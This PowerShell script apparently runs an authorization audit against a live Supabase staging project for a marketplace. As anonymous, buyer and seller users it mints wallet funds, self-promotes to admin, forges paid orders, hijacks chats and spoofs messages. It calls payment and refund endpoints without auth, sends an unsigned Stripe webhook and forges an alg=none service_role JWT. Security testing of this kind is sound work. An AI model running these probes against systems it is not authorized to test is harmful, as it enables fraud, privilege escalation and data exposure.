# Independent blind-audit probes. JWT buyer/seller + anon. service_role ONLY cleanup/observe.
# Does not modify application code. Disposable rows tagged AUDITCEGA27.

$ErrorActionPreference = 'Stop'
$envFile = Join-Path $PSScriptRoot 'live_ops_staging.env'
Get-Content $envFile | ForEach-Object {
  if ($_ -match '^\s*#' -or $_ -notmatch '=') { return }
  $k, $v = $_.Split('=', 2)
  [Environment]::SetEnvironmentVariable($k.Trim(), $v.Trim(), 'Process')
}

$Base = 'https://fxdknzrqjenzqcvnwqqq.supabase.co'
$Anon = $env:SUPABASE_ANON_KEY
$Svc = $env:SUPABASE_SERVICE_ROLE_KEY
$BuyerEmail = $env:LIVE_OPS_TEST_BUYER_EMAIL
$BuyerPass = $env:LIVE_OPS_TEST_BUYER_PASSWORD
$SellerEmail = $env:LIVE_OPS_TEST_SELLER_EMAIL
$SellerPass = $env:LIVE_OPS_TEST_SELLER_PASSWORD
$BuyerId = $env:LIVE_OPS_TEST_BUYER_ID
$SellerId = $env:LIVE_OPS_TEST_SELLER_ID

$out = [ordered]@{}
function Add-Result([string]$id, $obj) { $script:out[$id] = $obj; Write-Host ("{0}: {1}" -f $id, (($obj | ConvertTo-Json -Compress -Depth 6).Substring(0, [Math]::Min(220, (($obj | ConvertTo-Json -Compress -Depth 6).Length))))) }

function Invoke-Api {
  param(
    [string]$Method,
    [string]$Url,
    [hashtable]$Headers,
    $Body,
    [switch]$Raw
  )
  $h = @{ Accept = 'application/json' } + $Headers
  $params = @{ Uri = $Url; Method = $Method; Headers = $h; TimeoutSec = 45 }
  if ($null -ne $Body) {
    $params.ContentType = 'application/json'
    $params.Body = if ($Body -is [string]) { $Body } else { ($Body | ConvertTo-Json -Compress -Depth 8) }
  }
  try {
    $resp = Invoke-WebRequest @params
    $parsed = $null
    try { $parsed = $resp.Content | ConvertFrom-Json } catch { $parsed = $resp.Content }
    return @{ ok = $true; status = [int]$resp.StatusCode; body = $parsed; text = $resp.Content }
  } catch {
    $ex = $_.Exception
    $status = 0
    $text = $ex.Message
    if ($ex.Response) {
      $status = [int]$ex.Response.StatusCode
      try {
        $reader = New-Object System.IO.StreamReader($ex.Response.GetResponseStream())
        $text = $reader.ReadToEnd()
      } catch {}
    }
    $parsed = $null
    try { $parsed = $text | ConvertFrom-Json } catch { $parsed = $text }
    return @{ ok = $false; status = $status; body = $parsed; text = $text }
  }
}

function AuthHeaders([string]$jwt) {
  return @{ apikey = $Anon; Authorization = "Bearer $jwt"; Prefer = 'return=representation' }
}
function AnonHeaders {
  return @{ apikey = $Anon; Authorization = "Bearer $Anon" }
}

function SignIn([string]$email, [string]$pass) {
  $r = Invoke-Api POST "$Base/auth/v1/token?grant_type=password" @{ apikey = $Anon } @{ email = $email; password = $pass }
  if (-not $r.ok) { throw "login failed $email $($r.status) $($r.text)" }
  return $r.body.access_token
}

$buyerJwt = SignIn $BuyerEmail $BuyerPass
$sellerJwt = SignIn $SellerEmail $SellerPass
$BH = AuthHeaders $buyerJwt
$SH = AuthHeaders $sellerJwt
$AH = AnonHeaders
$svcH = @{ apikey = $Svc; Authorization = "Bearer $Svc"; Prefer = 'return=representation' }

# ---------- 1. Anon surface ----------
Add-Result 'anon_wallets' (Invoke-Api GET "$Base/rest/v1/wallets?select=id,balance&limit=3" $AH)
Add-Result 'anon_orders' (Invoke-Api GET "$Base/rest/v1/orders?select=id,buyer_id,status,price_total&limit=3" $AH)
Add-Result 'anon_products' (Invoke-Api GET "$Base/rest/v1/products?select=id,title,price,quantity,seller_id&limit=3" $AH)
Add-Result 'anon_profiles' (Invoke-Api GET "$Base/rest/v1/profiles?select=id,full_name,email,phone,user_type&limit=3" $AH)
Add-Result 'anon_lives_keys' (Invoke-Api GET "$Base/rest/v1/lives?select=id,mux_stream_key,stream_key,mux_playback_id&limit=2" $AH)
Add-Result 'anon_wallet_tx' (Invoke-Api GET "$Base/rest/v1/wallet_transactions?select=id,amount,type&limit=3" $AH)
Add-Result 'anon_credit_wallet' (Invoke-Api POST "$Base/rest/v1/rpc/batata_credit_wallet_once" $AH @{ p_wallet_id = $BuyerId; p_order_id = [guid]::NewGuid().ToString(); p_amount = 50; p_type = 'venda'; p_description = 'audit' })
Add-Result 'anon_create_raffle_prize' (Invoke-Api POST "$Base/rest/v1/rpc/batata_create_raffle_prize_order" $AH @{ p_raffle_id = [guid]::NewGuid().ToString(); p_winner_user_id = $BuyerId; p_qty = 1 })
Add-Result 'anon_stripe_convert' (Invoke-Api POST "$Base/rest/v1/rpc/batata_live_reservation_stripe_convert" $AH @{ p_request_id = [guid]::NewGuid().ToString(); p_order_id = [guid]::NewGuid().ToString() })
Add-Result 'anon_reviews' (Invoke-Api GET "$Base/rest/v1/reviews?select=id,comment,buyer_id,order_id,stars&limit=3" $AH)
Add-Result 'anon_reviews_public' (Invoke-Api GET "$Base/rest/v1/reviews_public_ratings?select=id,stars,comment,target_id&limit=3" $AH)
Add-Result 'anon_hub_profiles' (Invoke-Api GET "$Base/rest/v1/hub_profiles_public?select=handle,display_name&limit=3" $AH)

# ---------- 2. Wallet mint / privilege ----------
$balBefore = Invoke-Api GET "$Base/rest/v1/wallets?select=id,balance&id=eq.$BuyerId" $BH
Add-Result 'buyer_wallet_own' $balBefore
Add-Result 'buyer_credit_wallet' (Invoke-Api POST "$Base/rest/v1/rpc/batata_credit_wallet_once" $BH @{ p_wallet_id = $BuyerId; p_order_id = [guid]::NewGuid().ToString(); p_amount = 99.99; p_type = 'venda'; p_description = 'AUDITCEGA27 mint' })
Add-Result 'buyer_debit_wallet' (Invoke-Api POST "$Base/rest/v1/rpc/batata_debit_wallet_once" $BH @{ p_wallet_id = $BuyerId; p_order_id = [guid]::NewGuid().ToString(); p_amount = 1; p_description = 'AUDITCEGA27' })
Add-Result 'buyer_insert_wallet' (Invoke-Api POST "$Base/rest/v1/wallets" $BH @{ id = [guid]::NewGuid().ToString(); balance = 9999 })
Add-Result 'buyer_update_balance' (Invoke-Api PATCH "$Base/rest/v1/wallets?id=eq.$BuyerId" $BH @{ balance = 9999 })
Add-Result 'buyer_other_wallet' (Invoke-Api GET "$Base/rest/v1/wallets?select=id,balance&id=eq.$SellerId" $BH)
Add-Result 'buyer_payout_debit' (Invoke-Api POST "$Base/rest/v1/rpc/batata_wallet_payout_debit" $BH @{ p_user_id = $BuyerId; p_amount_cents = 100; p_idempotency_key = 'auditcega27xxxxxxxx' })
Add-Result 'buyer_admin_promote' (Invoke-Api PATCH "$Base/rest/v1/profiles?id=eq.$BuyerId" $BH @{ user_type = 'admin' })
$profAfter = Invoke-Api GET "$Base/rest/v1/profiles?select=id,user_type&id=eq.$BuyerId" $BH
Add-Result 'buyer_profile_after_admin' $profAfter
Add-Result 'buyer_is_admin' (Invoke-Api POST "$Base/rest/v1/rpc/batata_is_admin" $BH @{})
Add-Result 'buyer_admin_list' (Invoke-Api POST "$Base/rest/v1/rpc/batata_admin_list_profiles" $BH @{})
Add-Result 'buyer_ensure_other_wallet' (Invoke-Api POST "$Base/rest/v1/rpc/batata_ensure_wallet" $BH @{ p_user_id = $SellerId })

# ---------- 3. Cross-user reads ----------
Add-Result 'buyer_seller_orders' (Invoke-Api GET "$Base/rest/v1/orders?select=id,buyer_id,seller_id,status,price_total&seller_id=eq.$SellerId&buyer_id=neq.$BuyerId&limit=5" $BH)
Add-Result 'buyer_other_chats' (Invoke-Api GET "$Base/rest/v1/chats?select=id,user_a,user_b&limit=20" $BH)
Add-Result 'buyer_lives_keys' (Invoke-Api GET "$Base/rest/v1/lives?select=id,mux_stream_key,stream_key,mux_playback_id,seller_id&limit=3" $BH)
Add-Result 'seller_lives_keys' (Invoke-Api GET "$Base/rest/v1/lives?select=id,mux_stream_key,stream_key,mux_playback_id&limit=3" $SH)

# ---------- 4. Disposable product + order state machine + stock cross ----------
$prodBody = @{
  seller_id = $SellerId
  title = 'AUDITCEGA27 stock probe'
  price = 7.77
  quantity = 3
  list_on_marketplace = $false
  available_for_live = $false
  is_sold = $false
  description = 'AUDITCEGA27 disposable'
}
$prodIns = Invoke-Api POST "$Base/rest/v1/products" $SH $prodBody
Add-Result 'seller_create_product' $prodIns
$prodId = $null
if ($prodIns.ok -and $prodIns.body) {
  if ($prodIns.body -is [array]) { $prodId = $prodIns.body[0].id } else { $prodId = $prodIns.body.id }
}

$orderCross = $null
$orderOwn = $null
if ($prodId) {
  # Attack: buyer inserts order as seller of order, targeting seller's product
  $cross = Invoke-Api POST "$Base/rest/v1/orders" $BH @{
    buyer_id = $BuyerId
    seller_id = $BuyerId
    product_id = $prodId
    quantity = 2
    price_total = 1
    status = 'reserva_pendente'
    payment_method = 'Pagamento Direto ao Vendedor (MB WAY/Transf)'
  }
  Add-Result 'buyer_insert_cross_seller_order' $cross
  if ($cross.ok -and $cross.body) {
    $orderCross = if ($cross.body -is [array]) { $cross.body[0] } else { $cross.body }
  }

  if ($orderCross -and $orderCross.id) {
    $pago = Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderCross.id)" $BH @{ status = 'pago' }
    Add-Result 'buyer_as_order_seller_mark_pago' $pago
    $qtyAfter = Invoke-Api GET "$Base/rest/v1/products?select=id,quantity,is_sold&id=eq.$prodId" $SH
    Add-Result 'stock_after_cross_pago' $qtyAfter
    $orderAfter = Invoke-Api GET "$Base/rest/v1/orders?select=id,status,quantity,amount_paid_cents,price_total,seller_id,buyer_id,product_id&id=eq.$($orderCross.id)" $BH
    Add-Result 'cross_order_after_pago' $orderAfter
  }

  # Legitimate-looking buyer order against seller product
  $own = Invoke-Api POST "$Base/rest/v1/orders" $BH @{
    buyer_id = $BuyerId
    seller_id = $SellerId
    product_id = $prodId
    quantity = 1
    price_total = 7.77
    status = 'pago'
    payment_method = 'Pagamento na app'
    amount_paid_cents = 99999
  }
  Add-Result 'buyer_insert_forged_paid' $own
  if ($own.ok -and $own.body) {
    $orderOwn = if ($own.body -is [array]) { $own.body[0] } else { $own.body }
  }

  if ($orderOwn -and $orderOwn.id) {
    Add-Result 'buyer_set_amount_paid' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $BH @{ amount_paid_cents = 99999 })
    Add-Result 'buyer_set_pago' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $BH @{ status = 'pago' })
    Add-Result 'buyer_set_concluido' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $BH @{ status = 'concluido' })
    Add-Result 'buyer_set_devolvida' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $BH @{ status = 'devolvida' })
    Add-Result 'buyer_set_premio' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $BH @{ status = 'premio_rifa' })
    Add-Result 'seller_set_pago' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $SH @{ status = 'pago' })
    $qty2 = Invoke-Api GET "$Base/rest/v1/products?select=id,quantity,is_sold&id=eq.$prodId" $SH
    Add-Result 'stock_after_seller_pago' $qty2
    Add-Result 'buyer_release_wallet' (Invoke-Api POST "$Base/rest/v1/rpc/batata_release_seller_wallet_for_order" $BH @{ p_order_id = $orderOwn.id })
    Add-Result 'buyer_refund_wallet' (Invoke-Api POST "$Base/rest/v1/rpc/batata_refund_buyer_wallet_for_order" $BH @{ p_order_id = $orderOwn.id })
    Add-Result 'buyer_partial_refund' (Invoke-Api POST "$Base/rest/v1/rpc/batata_process_partial_refund_dispute" $BH @{ p_order_id = $orderOwn.id; p_refund_percent = 100 })
    Add-Result 'qty_patch_999' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $BH @{ quantity = 999 })
    Add-Result 'qty_patch_0' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $BH @{ quantity = 0 })
    Add-Result 'qty_patch_neg' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($orderOwn.id)" $BH @{ quantity = -5 })
  }
}

# Seller marks own-product order pago (MB WAY path) — control
if ($prodId) {
  $mb = Invoke-Api POST "$Base/rest/v1/orders" $BH @{
    buyer_id = $BuyerId
    seller_id = $SellerId
    product_id = $prodId
    quantity = 1
    price_total = 7.77
    status = 'reserva_pendente'
    payment_method = 'Pagamento Direto ao Vendedor (MB WAY/Transf)'
  }
  Add-Result 'mbway_order_insert' $mb
  $mbOrder = $null
  if ($mb.ok -and $mb.body) { $mbOrder = if ($mb.body -is [array]) { $mb.body[0] } else { $mb.body } }
  if ($mbOrder) {
    Add-Result 'seller_mbway_pago' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($mbOrder.id)" $SH @{ status = 'pago' })
    Add-Result 'mbway_stock' (Invoke-Api GET "$Base/rest/v1/products?select=id,quantity,is_sold&id=eq.$prodId" $SH)
    Add-Result 'mbway_release' (Invoke-Api POST "$Base/rest/v1/rpc/batata_release_seller_wallet_for_order" $BH @{ p_order_id = $mbOrder.id })
    # try buyer concluido then release
    Add-Result 'mbway_buyer_concluido' (Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($mbOrder.id)" $BH @{ status = 'concluido' })
    Add-Result 'mbway_release_after_concluido' (Invoke-Api POST "$Base/rest/v1/rpc/batata_release_seller_wallet_for_order" $BH @{ p_order_id = $mbOrder.id })
    $sellerBal = Invoke-Api GET "$Base/rest/v1/wallets?select=id,balance&id=eq.$SellerId" $SH
    Add-Result 'seller_wallet_after_mbway_release' $sellerBal
  }
}

# ---------- 5. Edge functions ----------
Add-Result 'edge_cpi_noauth' (Invoke-Api POST "$Base/functions/v1/create-payment-intent" @{ apikey = $Anon; Authorization = "Bearer $Anon" } @{ buyer_id = $BuyerId; order_id = [guid]::NewGuid().ToString(); amount = 1 })
if ($orderOwn -and $orderOwn.id) {
  Add-Result 'edge_cpi_underpay' (Invoke-Api POST "$Base/functions/v1/create-payment-intent" $BH @{
    buyer_id = $BuyerId; order_id = $orderOwn.id; amount = 50; product_id = $prodId; seller_id = $SellerId; shipping_method = 'hand delivery'
  })
  Add-Result 'edge_cpi_wrong_buyer' (Invoke-Api POST "$Base/functions/v1/create-payment-intent" $SH @{
    buyer_id = $BuyerId; order_id = $orderOwn.id; amount = 50000
  })
  Add-Result 'edge_refund_as_buyer' (Invoke-Api POST "$Base/functions/v1/refund-order" $BH @{ order_id = $orderOwn.id })
}
Add-Result 'edge_e2e_settle_jwt' (Invoke-Api POST "$Base/functions/v1/create-payment-intent?fase2_e2e_settle=1" $BH @{ order_id = [guid]::NewGuid().ToString(); payment_intent_id = 'pi_fake' })
Add-Result 'edge_e2e_oversell_jwt' (Invoke-Api POST "$Base/functions/v1/sec-fase2-e2e-oversell" $BH @{ probe = '1'; buyer_id = $BuyerId; seller_id = $SellerId })
Add-Result 'edge_webhook_nosig' (Invoke-Api POST "$Base/functions/v1/stripe-webhook" @{ apikey = $Anon; Authorization = "Bearer $Anon" } @{ type = 'checkout.session.completed' })
Add-Result 'edge_connect_other_user' (Invoke-Api POST "$Base/functions/v1/create-connect-account" $BH @{ user_id = $SellerId; amount = 100; idempotency_key = 'auditcega27otheruser' })
Add-Result 'edge_delete_test' (Invoke-Api POST "$Base/functions/v1/delete-test-account" $BH @{ confirm = 'APAGAR TUDO' })
Add-Result 'edge_mux_as_buyer' (Invoke-Api POST "$Base/functions/v1/create-mux-live" $BH @{ title = 'AUDITCEGA27 live' })
Add-Result 'edge_ocr_notoken' (Invoke-Api POST "$Base/functions/v1/ingest-ocr-reservation" @{ apikey = $Anon } @{ live_id = [guid]::NewGuid().ToString(); ocr_line_hash = 'abcdefghij'; detected_at = (Get-Date).ToString('o'); ref_number = 1 })
Add-Result 'edge_tip_client_id' (Invoke-Api POST "$Base/functions/v1/create-live-tip-checkout" $BH @{ live_id = [guid]::NewGuid().ToString(); amount_eur = 1; tip_id = [guid]::NewGuid().ToString() })
Add-Result 'edge_cleanup_noauth' (Invoke-Api POST "$Base/functions/v1/livekit-egress-cleanup" @{ apikey = $Anon; Authorization = "Bearer $Anon" } @{})

# JWT alg=none service_role claim
$nonePayload = '{"role":"service_role","iss":"supabase"}'
$noneJwt = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($nonePayload)).TrimEnd('=').Replace('+','-').Replace('/','_') + '.'
Add-Result 'edge_e2e_alg_none' (Invoke-Api POST "$Base/functions/v1/create-payment-intent?fase2_e2e_settle=1" @{ apikey = $Anon; Authorization = "Bearer $noneJwt" } @{ order_id = [guid]::NewGuid().ToString(); payment_intent_id = 'pi_fake' })

# ---------- 6. Storage ----------
Add-Result 'storage_private_list' (Invoke-Api POST "$Base/storage/v1/object/list/fleaber_private" $BH @{ prefix = 'order_proofs'; limit = 5 })
Add-Result 'storage_chat_proofs' (Invoke-Api POST "$Base/storage/v1/object/list/chat_media" $AH @{ prefix = 'order_proofs'; limit = 5 })
Add-Result 'storage_chat_public' (Invoke-Api POST "$Base/storage/v1/object/list/chat_media" $AH @{ prefix = 'product_photos'; limit = 3 })

# ---------- 7. Reservation / raffle RPCs ----------
Add-Result 'buyer_draw_raffle' (Invoke-Api POST "$Base/rest/v1/rpc/batata_draw_live_raffle_winners" $BH @{ p_live_id = [guid]::NewGuid().ToString() })
Add-Result 'buyer_create_prize' (Invoke-Api POST "$Base/rest/v1/rpc/batata_create_raffle_prize_order" $BH @{ p_raffle_id = [guid]::NewGuid().ToString(); p_winner_user_id = $BuyerId; p_qty = 1 })
Add-Result 'buyer_stripe_convert' (Invoke-Api POST "$Base/rest/v1/rpc/batata_live_reservation_stripe_convert" $BH @{ p_request_id = [guid]::NewGuid().ToString(); p_order_id = [guid]::NewGuid().ToString() })
Add-Result 'buyer_bag_qty' (Invoke-Api POST "$Base/rest/v1/rpc/batata_live_bag_update_qty" $BH @{ p_request_id = [guid]::NewGuid().ToString(); p_qty = 99 })
Add-Result 'buyer_settle_tip' (Invoke-Api POST "$Base/rest/v1/rpc/batata_settle_live_tip_from_stripe" $BH @{ p_tip_id = [guid]::NewGuid().ToString(); p_stripe_session_id = 'cs_test_x'; p_paid_amount_cents = 50000 })

# ---------- 8. Chat hijack ----------
$chats = Invoke-Api GET "$Base/rest/v1/chats?select=id,user_a,user_b&limit=3" $BH
Add-Result 'buyer_chats_sample' $chats
if ($chats.ok -and $chats.body -is [array] -and $chats.body.Count -gt 0) {
  $cid = $chats.body[0].id
  $fakeThird = [guid]::NewGuid().ToString()
  Add-Result 'buyer_chat_replace_party' (Invoke-Api PATCH "$Base/rest/v1/chats?id=eq.$cid" $BH @{ user_b = $fakeThird })
  $msgs = Invoke-Api GET "$Base/rest/v1/chat_messages?select=id,sender_id,text&chat_id=eq.$cid&limit=3" $BH
  Add-Result 'buyer_chat_msgs' $msgs
  if ($msgs.ok -and $msgs.body -is [array] -and $msgs.body.Count -gt 0) {
    $mid = $msgs.body[0].id
    $sid = $msgs.body[0].sender_id
    if ($sid -ne $BuyerId) {
      Add-Result 'buyer_edit_other_msg' (Invoke-Api PATCH "$Base/rest/v1/chat_messages?id=eq.$mid" $BH @{ text = 'AUDITCEGA27 spoof' })
    }
  }
}

# ---------- 9. Observe grants (service_role read-only SQL via rpc if exists; else skip) ----------
# Try to read wallets as svc for cleanup comparison only
$balAfter = Invoke-Api GET "$Base/rest/v1/wallets?select=id,balance&id=eq.$BuyerId" $BH
Add-Result 'buyer_wallet_after' $balAfter

# ---------- CLEANUP disposable (service_role) ----------
$cleanup = @()
if ($prodId) {
  $ords = Invoke-Api GET "$Base/rest/v1/orders?select=id,status,stock_units_applied&product_id=eq.$prodId" $svcH
  $cleanup += @{ orders_found = $ords }
  if ($ords.ok -and $ords.body) {
    foreach ($o in @($ords.body)) {
      # cancel to restore stock if paid
      $c1 = Invoke-Api PATCH "$Base/rest/v1/orders?id=eq.$($o.id)" $svcH @{ status = 'cancelado' }
      $cleanup += @{ cancel = $o.id; result = $c1.status }
      $d1 = Invoke-Api DELETE "$Base/rest/v1/orders?id=eq.$($o.id)" $svcH
      $cleanup += @{ delete_order = $o.id; result = $d1.status }
    }
  }
  $dp = Invoke-Api DELETE "$Base/rest/v1/products?id=eq.$prodId" $svcH
  $cleanup += @{ delete_product = $prodId; result = $dp.status }
}
Add-Result 'cleanup' @{ steps = $cleanup.Count }

$reportPath = Join-Path $PSScriptRoot 'reports\_audit_cega_indep_20260827_probes.json'
$json = $out | ConvertTo-Json -Depth 10
[IO.File]::WriteAllText($reportPath, $json)
Write-Host "WROTE $reportPath keys=$($out.Count)"
